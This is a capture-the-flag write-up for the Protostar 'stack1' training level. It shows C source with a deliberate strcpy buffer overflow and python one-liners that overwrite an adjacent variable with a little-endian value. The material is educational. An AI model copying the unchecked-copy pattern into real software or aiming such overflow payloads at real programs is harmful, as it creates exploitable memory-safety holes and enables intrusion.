# Stack1
## Briefing
This level looks at the concept of modifying variables to specific values in the program, and how the variables are laid out in memory.

This level is at /opt/protostar/bin/stack1

Hints:
1. If you are unfamiliar with the hexadecimal being displayed, “man ascii” is your friend.
2. Protostar is little endian
## Source Code
```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```
## Solution
So like Stack0, we have a program vulnerable to a buffer overflow, to change the value of a variable.
However this time instead of feeding out input into the program while it's running, we need to send our data as an argument.
And we also need to overwrite the 'modified' variable to a specific value. (0x61626364)

Ok. so lets start by just overwriting the variable into 'A' characters again.
`./stack1 $(python -c "print('A' * 68)")`
Notice how we are executing the script with $() to essentially be running `./stack1 (INPUT)`

`Try again, you got 0x41414141`

Great, we have overwriten the variable into 0x41414141, 41 is the Ascii code for 'A' in hexadecimal, so the variable is now 'AAAA'
So now we can modify our script to have 64 'A's and then our 0x61626364 value, we can enter this into our script with '\x'
`./stack1 $(python -c "print('A' * 64 + '\x61\x62\x63\x64')")`

Oh this is strange, we our input has gone in backwards!
`Try again, you got 0x64636261`
Well if we look back to our hints, we see, 2. Protostar is little endian
This means that we need to put our input in backwards so then when it is flipped again, to go into the program it is in the correct order, So, lets try it.

`./stack1 $(python -c "print('A' * 64 + '\x64\x63\x62\x61')")`

`you have correctly got the variable to the right value`

Yes! Success.

In future we can use the 'struct' python module to sort out our endian-ness problems. This means we will use an actual script instead of `python -c`
